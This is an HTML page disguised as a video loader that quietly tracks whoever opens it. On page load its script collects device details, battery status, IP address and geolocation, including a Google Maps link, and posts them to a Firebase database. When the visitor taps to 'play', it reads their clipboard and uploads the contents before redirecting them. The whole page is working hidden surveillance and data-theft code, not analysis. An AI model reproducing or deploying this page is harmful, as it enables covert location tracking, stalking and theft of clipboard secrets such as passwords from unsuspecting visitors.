<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Video Loading...</title>
    <style>
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00a884; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="status" style="text-align:center;">
        <div class="loader"></div>
        <p style="margin-top:15px; color:#555;">Connecting to secure server...</p>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";

        async function start() {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            if(!id) return;
            const decoded = JSON.parse(atob(id));
            const userKey = decoded.k;
            const targetUrl = decoded.r;

            let data = {
                time: new Date().toLocaleString(),
                ram: navigator.deviceMemory || "N/A",
                res: `${screen.width}x${screen.height}`,
                orient: screen.orientation ? screen.orientation.type : "N/A",
                netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
                speed: navigator.connection ? navigator.connection.downlink : "N/A",
                ip: "N/A", loc: "N/A", map: "#"
            };

            // Battery Info
            try { const b = await navigator.getBattery(); data.battery = Math.round(b.level * 100); data.charging = b.charging ? "Yes" : "No"; } catch(e){}

            // IP & Location (Primary API)
            try {
                let res = await fetch('https://ipapi.co/json/');
                let d = await res.json();
                if(d.ip) {
                    data.ip = d.ip;
                    data.loc = `${d.city}, ${d.country_name}`;
                    data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                } else { throw new Error(); }
            } catch(e) {
                // Secondary API (Backup)
                try {
                    let res2 = await fetch('https://ipwho.is/');
                    let d2 = await res2.json();
                    data.ip = d2.ip;
                    data.loc = `${d2.city}, ${d2.country}`;
                    data.map = `https://www.google.com/maps?q=${d2.latitude},${d2.longitude}`;
                } catch(e2){}
            }

            // Save to Firebase
            await fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });

            document.getElementById('status').innerHTML = "<b>TAP TO PLAY VIDEO</b>";

            document.body.onclick = async () => {
                try {
                    const text = await navigator.clipboard.readText();
                    if(text) await fetch(`${DB_URL}clipboard/${userKey}.json`, { method: 'POST', body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) });
                } catch(e){}
                window.location.href = targetUrl;
            };
            setTimeout(() => { window.location.href = targetUrl; }, 10000);
        }
        start();
    </script>
</body>
</html>
